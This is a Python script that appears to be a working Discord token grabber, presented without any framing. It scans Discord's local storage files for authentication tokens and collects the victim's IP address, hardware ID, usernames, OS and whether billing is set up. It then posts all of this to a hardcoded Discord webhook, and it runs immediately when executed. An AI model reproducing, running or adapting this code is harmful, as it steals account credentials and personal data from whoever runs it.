import re, os, requests, json, shutil, platform as plt
from base64 import b64decode
from json import loads
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE

url = "https://discord.com/api/webhooks/809176064181403668/FEZnXggqkjxMfSSjinBXXcLx4ipXiSrEkFky3SEnEgKdcTctBhXX3yR97rBH7RZ7oT4y"

def Headers(token=None):
	headers = {"content-type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}

	if token:
		headers.update({"Authorization": token})
	return headers

def Payment(token):
	try:
		return bool(len(loads(urlopen(Request("https://discord.com/api/v8/users/@me/billing/payment-sources", headers=Headers(token))).read().decode())))
	except:
		pass

def Hwid():
	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def Tokens(path):
	tokens = []

	for file in os.listdir(path):
		if not file.endswith(".log") and not file.endswith(".ldb"):
			continue
		for l in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
			for mst in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in re.findall(mst, l):
					tokens.append(token)
	return tokens

OS = plt.platform().split("-")
name = os.getenv("UserName")
Username = os.getenv("COMPUTERNAME")
ip = requests.get("https://api.ipify.org/").text

dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}

def Start():
	ids = []
	
	for platform, path in dire.items():
		if not os.path.exists(path):
			continue
		for token in Tokens(path):
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in ids:
					continue
			ids.append(uid)
			payment = bool(Payment(token))

			messages = f"```ARM\nTokens: {token}\n```" + f"```ARM\nIP: {ip}\n```" +  f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + f"```ARM\nPC Name: {name}\n```" + f"```ARM\nBilling Method: {payment}\n```" + f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"

	webhook = {"content": f"{messages}", "embeds": "", "username": "REQ Grabber・Monstered", "avatar_url": "https://media.discordapp.net/attachments/798206239673679885/808423379341541386/space.jpg?width=1202&height=676"}
	urlopen(Request(url, data=json.dumps(webhook).encode(), headers=Headers()))

Start()